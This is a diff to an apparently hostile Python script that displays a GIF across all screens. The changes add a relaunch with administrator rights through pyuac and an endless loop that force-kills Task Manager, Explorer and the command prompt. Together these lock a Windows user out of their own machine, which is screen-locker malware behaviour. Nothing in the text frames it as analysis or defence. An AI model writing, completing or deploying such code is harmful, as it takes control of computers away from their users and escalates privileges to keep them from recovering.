@@ -4,6 +4,7 @@ from PIL import Image, ImageTk, ImageSequence
 import screeninfo
 import threading
 import os
+import pyuac
 
 def display_gif_on_screen(screen, gif_path):
     root = tk.Tk()
@@ -53,12 +54,17 @@ def main():
 
 def kill_apps():
     while True:
-        os.system("taskkill /f /im cmd.exe && taskkill /f /im taskmgr.exe")
+        os.system("taskkill /f /im taskmgr.exe")
+        os.system("taskkill /f /im explorer.exe")
+        os.system("taskkill /f /im cmd.exe")
+
 
 if __name__ == "__main__":
+    if not pyuac.isUserAdmin():
+        print("Re-launching as admin!")
+        pyuac.runAsAdmin()
+    else:        
+        t = threading.Thread(target=kill_apps)
+        t.start()
 
-    t = threading.Thread(target=kill_apps)
-    t.start()
-
-    main()
-
+        main()
